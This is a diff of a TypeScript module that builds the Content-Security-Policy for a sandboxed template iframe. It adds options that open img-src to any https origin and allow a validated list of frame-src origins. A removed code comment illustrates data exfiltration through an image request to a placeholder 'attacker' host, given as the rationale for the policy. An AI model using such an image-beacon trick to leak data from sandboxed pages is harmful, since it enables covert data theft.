@@ -42,6 +42,17 @@ export interface CreateSrcdocOptions {
    */
   readonly mediaOrigins?: readonly string[]
   /**
+   * `true`면 CSP img-src에 `https:`를 더해 모든 https 이미지(외부 썸네일 등)를 연다. media-src·font-src는 그대로.
+   * 프레임은 이미 `connect-src https:`로 임의 https에 요청할 수 있으므로 새 유출 경로는 생기지 않는다. 기본 `false`.
+   */
+  readonly imagesAnyHttps?: boolean
+  /**
+   * 템플릿이 `<iframe>`으로 임베드할 수 있는 origin(정확한 https origin, 최대 `MAX_FRAME_ORIGINS`개).
+   * CSP frame-src에만 실린다. 기본은 `'none'`. 임베드 프레임은 격리 프레임의 sandbox(`allow-same-origin` 없음)를
+   * 물려받으므로 출처·저장소가 필요한 플레이어(예: YouTube)는 열어도 동작하지 않는다.
+   */
+  readonly frameOrigins?: readonly string[]
+  /**
    * 엔트리 script의 `crossOrigin`. `'anonymous'`만 받는다(그 밖의 값은 TypeError). 주면 교차 origin 번들의
    * 에러가 "Script error."로 가려지지 않고 메시지·스택이 보인다 — 대신 assetOrigin이 CORS
    * (`Access-Control-Allow-Origin`)로 응답해야 하며, 아니면 엔트리 로드 자체가 실패한다. 기본은 속성 없음.
@@ -51,6 +62,15 @@ export interface CreateSrcdocOptions {
 
 /** mediaOrigins 최대 개수. */
 export const MAX_MEDIA_ORIGINS = 20
+
+/** frameOrigins 최대 개수. */
+export const MAX_FRAME_ORIGINS = 10
+
+/** `buildFrameCsp`의 선택 옵션(`createSrcdoc`의 같은 이름 옵션). */
+export interface FrameCspOptions {
+  readonly imagesAnyHttps?: boolean
+  readonly frameOrigins?: readonly string[]
+}
 
 /**
  * 에러 보고 묶음 대기(ms) — 첫 발생 뒤 이만큼 기다리며 같은 fingerprint를 count로 묶어 한 번 보낸다.
@@ -102,26 +122,42 @@ function assertEntryUrl(entryUrl: string, assetOrigin: string): string {
 }
 
 /**
- * mediaOrigins를 검증한다 — 정확한 https origin만(경로·쿼리·userinfo·와일드카드·대문자 호스트 거절),
- * 최대 `MAX_MEDIA_ORIGINS`개, 중복 제거. 조용히 버리지 않고 하나라도 틀리면 던진다
+ * CSP 소스 origin 목록을 검증한다 — 정확한 https origin만(경로·쿼리·userinfo·와일드카드·대문자 호스트 거절),
+ * 최대 `max`개, 중복 제거. 조용히 버리지 않고 하나라도 틀리면 던진다
  * (CSP 소스로 들어가므로 잘못된 값이 정책을 넓히거나 지시어를 끊으면 안 된다).
  */
-function normalizeMediaOrigins(value: unknown): readonly string[] {
+function normalizeHttpsOrigins(label: string, value: unknown, max: number): readonly string[] {
   if (value === undefined) return Object.freeze([])
   if (!Array.isArray(value)) {
-    throw new TypeError('[bstage-bridge] mediaOrigins는 배열이어야 합니다')
+    throw new TypeError(`[bstage-bridge] ${label}는 배열이어야 합니다`)
   }
-  if (value.length > MAX_MEDIA_ORIGINS) {
-    throw new TypeError(`[bstage-bridge] mediaOrigins는 최대 ${MAX_MEDIA_ORIGINS}개입니다`)
+  if (value.length > max) {
+    throw new TypeError(`[bstage-bridge] ${label}는 최대 ${max}개입니다`)
   }
   const origins = value.map((o: unknown) => {
     const origin = normalizeExactOrigin(o, ['https:'])
     if (!origin) {
-      throw new TypeError('[bstage-bridge] mediaOrigins 항목은 정확한 https origin이어야 합니다')
+      throw new TypeError(`[bstage-bridge] ${label} 항목은 정확한 https origin이어야 합니다`)
     }
     return origin
   })
   return Object.freeze([...new Set(origins)])
+}
+
+function normalizeMediaOrigins(value: unknown): readonly string[] {
+  return normalizeHttpsOrigins('mediaOrigins', value, MAX_MEDIA_ORIGINS)
+}
+
+function normalizeFrameOrigins(value: unknown): readonly string[] {
+  return normalizeHttpsOrigins('frameOrigins', value, MAX_FRAME_ORIGINS)
+}
+
+function normalizeImagesAnyHttps(value: unknown): boolean {
+  if (value === undefined) return false
+  if (typeof value !== 'boolean') {
+    throw new TypeError('[bstage-bridge] imagesAnyHttps는 불리언이어야 합니다')
+  }
+  return value
 }
 
 /**
@@ -130,26 +166,31 @@ function normalizeMediaOrigins(value: unknown): readonly string[] {
  * connect-src는 항상 `https: wss:`다(프레임 네트워크 규칙, README "프레임 네트워크") — 토큰이 필요한 API는
  * 부트스트랩의 `__bstage_fetch__`가 브리지로 보내고, 그 밖의 https API는 템플릿이 직접 부른다. 평문(`http:`·`ws:`)은 열지 않는다.
  *
- * img-src·media-src에 맨 `https:`를 두지 않는다 — 두면 템플릿이 `<img src="https://attacker/?d=...">`로
- * 임의 origin에 GET을 보낼 수 있다. 외부 이미지·미디어는 `mediaOrigins`로 정확한 origin만 연다.
+ * 기본은 img-src·media-src에 맨 `https:`를 두지 않고 `mediaOrigins`로 정확한 origin만 연다. 호스트가
+ * `imagesAnyHttps`를 켜면 img-src에만 `https:`를 더한다(connect-src가 이미 `https:`라 유출 경로가 늘지 않는다).
+ * frame-src는 기본 `'none'`이고 `frameOrigins`로 정확한 https origin만 연다.
  *
- * @throws TypeError mediaOrigins가 형식에 맞지 않을 때
+ * @throws TypeError mediaOrigins·options가 형식에 맞지 않을 때
  */
 export function buildFrameCsp(
   nonce: string,
   assetOrigin: string,
   mediaOrigins: readonly string[] = [],
+  options: FrameCspOptions = {},
 ): string {
   const media = [assetOrigin, ...normalizeMediaOrigins(mediaOrigins)].join(' ')
+  const images = normalizeImagesAnyHttps(options.imagesAnyHttps) ? `${media} https:` : media
+  const frames = normalizeFrameOrigins(options.frameOrigins)
+  const frameSrc = frames.length > 0 ? frames.join(' ') : "'none'"
   return [
     "default-src 'none'",
     `script-src 'nonce-${nonce}' ${assetOrigin}`,
     `style-src 'unsafe-inline' ${assetOrigin}`,
-    `img-src ${media} data: blob:`,
+    `img-src ${images} data: blob:`,
     `font-src ${assetOrigin} data:`,
     `media-src ${media} blob:`,
     'connect-src https: wss:',
-    "frame-src 'none'",
+    `frame-src ${frameSrc}`,
     "form-action 'none'",
     "base-uri 'none'",
   ].join('; ')
@@ -241,7 +282,7 @@ function bootstrapScript(o: {
  *
  * iframe 속성은 `IFRAME_ATTRIBUTES`(sandbox="allow-scripts" 등)를 쓴다.
  *
- * @throws TypeError 입력이 형식에 맞지 않을 때(잘못된 nonce·세션·origin·엔트리·요소 이름·mediaOrigins·crossOrigin)
+ * @throws TypeError 입력이 형식에 맞지 않을 때(잘못된 nonce·세션·origin·엔트리·요소 이름·mediaOrigins·imagesAnyHttps·frameOrigins·crossOrigin)
  */
 export function createSrcdoc(options: CreateSrcdocOptions): string {
   const { nonce, session, title, elementName } = options
@@ -255,12 +296,14 @@ export function createSrcdoc(options: CreateSrcdocOptions): string {
   }
   if (typeof title !== 'string') throw new TypeError('[bstage-bridge] title은 문자열이어야 합니다')
   const mediaOrigins = normalizeMediaOrigins(options.mediaOrigins)
+  const imagesAnyHttps = normalizeImagesAnyHttps(options.imagesAnyHttps)
+  const frameOrigins = normalizeFrameOrigins(options.frameOrigins)
   const { crossOrigin } = options
   if (crossOrigin !== undefined && crossOrigin !== 'anonymous') {
     throw new TypeError("[bstage-bridge] crossOrigin은 'anonymous'만 받습니다")
   }
 
-  const csp = buildFrameCsp(nonce, assetOrigin, mediaOrigins)
+  const csp = buildFrameCsp(nonce, assetOrigin, mediaOrigins, { imagesAnyHttps, frameOrigins })
   const script = bootstrapScript({ session, hostOrigin, entryUrl, elementName, crossOrigin })
   // 보간 값은 위에서 이스케이프했으므로, 걸린다면 런타임 소스(toString) 쪽 문제다 — 조용히 내보내지 않는다.
   if (/<\/script|<!--/i.test(script)) {
